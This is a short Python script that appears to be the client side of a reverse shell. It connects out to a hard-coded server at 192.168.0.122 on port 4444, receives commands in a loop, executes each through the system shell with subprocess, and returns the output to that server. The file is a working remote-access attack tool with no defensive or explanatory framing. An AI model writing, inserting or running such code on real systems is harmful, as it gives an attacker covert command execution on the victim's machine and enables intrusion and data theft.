import sys
import socket
import subprocess

SERVER_IP = "192.168.0.122"
PORT = 4444

# Create a socket object
s = socket.socket()

# Connect to the server
s.connect((SERVER_IP, PORT))

# Receive and print the server's initial message
msg = s.recv(1024).decode()
print('[*] Server:', msg)

while True:
    # Receive command from the server
    cmd = s.recv(1024).decode()
    print(f'[+] Received command: {cmd}')

    # Break the loop if the command is to quit
    if cmd.lower() in ['q', 'quit', 'exit', 'x']:
        break

    try:
        # Execute the command and capture the output
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    # If the result is empty, send a success message
    if len(result) == 0:
        result = '[+] Executed Successfully'.encode()

    # Send the result back to the server
    s.send(result)

# Close the socket connection
s.close()
